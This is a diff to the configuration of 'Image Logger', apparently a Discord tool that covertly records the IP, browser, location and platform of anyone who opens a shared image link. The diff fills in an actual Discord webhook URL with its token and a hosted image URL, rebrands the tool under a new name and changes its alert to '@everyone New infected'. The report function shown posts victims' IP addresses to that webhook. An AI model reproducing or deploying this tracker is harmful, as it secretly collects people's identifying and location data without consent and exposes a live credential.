@@ -10,13 +10,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1201218067317915712/5eNGKiezMREI-Q1khXxhUSS5rx5_KhkYbCMrEZRdHbQ8rhcc5gyOenhPXwozJzBxE1SH",
+    "image": "https://cdn.discordapp.com/attachments/1177019009141592086/1201204042135785524/image.png?ex=65c8f770&is=65b68270&hm=41a2793f38916be3785c581f5348de7cbbf51c7471610e01256d4844b5502774&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Image Logger by yiko", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -26,7 +26,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "@everyone New infected", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -94,10 +94,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "",
+    "content": "@everyone new infected",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "Image logger by yiko",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
